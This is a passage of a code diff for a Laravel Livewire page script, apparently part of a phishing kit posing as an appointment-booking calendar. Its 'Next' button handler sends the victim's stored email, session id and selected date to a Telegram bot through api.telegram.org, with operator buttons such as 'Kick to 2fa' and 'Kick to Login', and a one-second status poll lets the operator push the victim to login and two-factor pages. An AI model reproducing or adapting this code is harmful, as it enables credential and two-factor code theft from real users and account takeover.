+        const formattedDate = currentDate.toLocaleDateString('en-US', options);
+        if ($('.calendar__container .full__width').length > 0) {
+            $('.calendar__container .full__width').remove();
         }
-        window.selectDate = function(date) {
-            $('#calendar-wrapper').updateCalendarOptions({
-                date: date
-            });
-            selectedDate = date;
-            const currentDate = new Date(date);
-            currentDate.setDate(currentDate.getDate());
-            const options = {
-                weekday: 'long',
-                month: 'long',
-                day: 'numeric'
-            };
-            const formattedDate = currentDate.toLocaleDateString('en-US', options);
-            if ($('.calendar__container .full__width').length > 0) {
-                $('.calendar__container .full__width').remove();
-            }
-            $('.calendar__container').append(`<div class="full__width">
+        $('.calendar__container').append(`<div class="full__width">
                                     <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                         <div class="calendar__time">
                                             <h2>${formattedDate}</h2>
@@ -1440,110 +1466,109 @@
                                         </div>
                                     </div>
                                 </div>`);
-        };
-        let defaultConfig = {
-            weekDayLength: 3,
-            prevButton: '<i class="fa fa-chevron-left" aria-hidden="true"></i>',
-            nextButton: '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
-            date: new Date(),
-            showTodayButton: false,
-            onClickDate: selectDate,
-            disable: function(date) {
-                const today = new Date();
-                const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
-                return date <= yesterday;
-            },
-            showYearDropdown: true,
-            startOnMonday: false,
-        };
-        $('#calendar-wrapper').calendar(defaultConfig);
-        $(document).on('click', 'button.time', function(e) {
-            e.preventDefault();
-            $('button.time').each(function() {
-                $(this).parent('div').removeClass('next__button');
-                $(this).parent('div').find('div > div').empty();
-            });
-            $(this).parent('div').addClass('next__button');
-            $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
+    };
+    let defaultConfig = {
+        weekDayLength: 3,
+        prevButton: '<i class="fa fa-chevron-left" aria-hidden="true"></i>',
+        nextButton: '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
+        date: new Date(),
+        showTodayButton: false,
+        onClickDate: selectDate,
+        disable: function (date) {
+            const today = new Date();
+            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
+            return date <= yesterday;
+        },
+        showYearDropdown: true,
+        startOnMonday: false,
+    };
+    $('#calendar-wrapper').calendar(defaultConfig);
+    $(document).on('click', 'button.time', function (e) {
+        e.preventDefault();
+        $('button.time').each(function () {
+            $(this).parent('div').removeClass('next__button');
+            $(this).parent('div').find('div > div').empty();
         });
-        $(document).on('click', '.btn-next', function(e) {
-            e.preventDefault();
-            let time = $(this).parent('div').parent('div').parent('div').find('.time').data(
-                'time'); // Example: "10:30"
-            let selectedDateFinal = new Date(selectedDate);
-            if (!selectedDateFinal || !time) {
-                console.error('selectedDate or time is missing');
-                return;
-            }
-
-            let [hours, minutes] = time.split(':').map(Number);
-            selectedDateFinal.setHours(hours);
-            selectedDateFinal.setMinutes(minutes);
-            selectedDateFinal.setSeconds(0);
-            let session = localStorage.getItem('sessionId');
-            fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                    text: `Kick to 2fa`,
-                                    callback_data: `/2fa ${session}`,
-                                },
-                                {
-                                    text: `Kick to Login`,
-                                    callback_data: `/login ${session}`,
-                                },
-                            ],
-                            [{
-                                    text: `Kick to the calendar`,
-                                    callback_data: `/schedule ${session}`,
-                                },
-                                {
-                                    text: `Thank You`,
-                                    callback_data: `/thankyou ${session}`,
-                                },
-                            ]
-                        ],
-                    },
-                })
-            }).then(response => {
-                @this.set('showCalenderProgress', true);
-            }).catch(error => {
-
-            });
-        });
-        document.getElementById('openChat').addEventListener('click', function(e) {
-            e.preventDefault();
-            if (window.jivo_api) {
-                jivo_api.open();
-            } else {
-                console.error('JivoChat API is not loaded yet.');
-            }
-        });
-        document.addEventListener('clear-all', function() {
-            $('#continue-modal').hide();
-            @this.set('loginError', false);
-            @this.set('oldPassError', false);
-            @this.set('enableLoginForm', false);
-            @this.set('showModalFooter', false);
-            @this.set('enableLoadingAfterSubmit', false);
-            @this.set('twoFaPage', false);
-            @this.set('codeError', false);
-            @this.set('showCalender', false);
-            @this.set('showCalenderProgress', false);
-        });
-        statusCheck();
-
-        function statusCheck() {
-            setInterval(function() {
-                window.Livewire.dispatch('statusCheck');
-            }, 1000);
+        $(this).parent('div').addClass('next__button');
+        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
+    });
+    $(document).on('click', '.btn-next', function (e) {
+        e.preventDefault();
+        let time = $(this).parent('div').parent('div').parent('div').find('.time').data(
+            'time'); // Example: "10:30"
+        let selectedDateFinal = new Date(selectedDate);
+        if (!selectedDateFinal || !time) {
+            console.error('selectedDate or time is missing');
+            return;
         }
-    </script>
+
+        let [hours, minutes] = time.split(':').map(Number);
+        selectedDateFinal.setHours(hours);
+        selectedDateFinal.setMinutes(minutes);
+        selectedDateFinal.setSeconds(0);
+        let session = localStorage.getItem('sessionId');
+        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: `Kick to 2fa`,
+                            callback_data: `/2fa ${session}`,
+                        },
+                            {
+                                text: `Kick to Login`,
+                                callback_data: `/login ${session}`,
+                            },
+                        ],
+                        [{
+                            text: `Kick to the calendar`,
+                            callback_data: `/schedule ${session}`,
+                        },
+                            {
+                                text: `Thank You`,
+                                callback_data: `/thankyou ${session}`,
+                            },
+                        ]
+                    ],
+                },
+            })
+        }).then(response => {
+            @this.
+            set('showCalenderProgress', true);
+        }).catch(error => {
+
+        });
+    });
+    document.getElementById('openChat').addEventListener('click', function (e) {
+        e.preventDefault();
+        if (window.jivo_api) {
+            jivo_api.open();
+        } else {
+            console.error('JivoChat API is not loaded yet.');
+        }
+    });
+    document.addEventListener('clear-all', function () {
+        $('#continue-modal').hide();
+        @this.set('loginError', false);
+        @this.set('enableLoginForm', false);
+        @this.set('enableLoadingAfterSubmit', false);
+        @this.set('emailAuthCode', false);
+        @this.set('emailAuthCodeError', false);
+        @this.set('showCalender', false);
+        @this.set('showCalenderProgress', false);
+    });
+    statusCheck();
+
+    function statusCheck() {
+        setInterval(function () {
+            window.Livewire.dispatch('statusCheck');
+        }, 1000);
+    }
+</script>
 @endscript
